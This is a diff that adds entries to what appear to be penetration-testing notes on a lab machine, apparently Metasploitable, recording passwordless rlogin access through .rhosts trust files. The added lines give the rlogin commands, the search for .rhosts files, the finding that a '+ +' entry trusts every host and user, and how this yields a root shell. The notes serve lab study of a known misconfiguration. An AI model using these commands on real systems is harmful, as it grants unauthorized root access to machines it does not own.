@@ -355,6 +355,20 @@ dangerous because:
 find .rhosts files: find / -name ".rhosts" 2>/dev/null
 if .rhosts exists with your IP — rlogin connects with no password
 
+rlogin exploitation: [DONE]
+rlogin -l username TARGET_IP
+connected as msfadmin with no password — trust relationship active
+.rhosts files found:
+  /home/msfadmin/.rhosts
+  /root/.rhosts
+read contents: cat /home/msfadmin/.rhosts
+if Kali IP listed — passwordless login confirmed
+critical: if /root/.rhosts trusts our IP — rlogin -l root gives root shell
+.rhosts contents: + +
+meaning: trust ALL hosts, trust ALL users — no authentication required
+impact: anyone can rlogin as any user including root with no password
+this is the most dangerous .rhosts configuration possible
+
 ======================================================
 SSH
 ======================================================
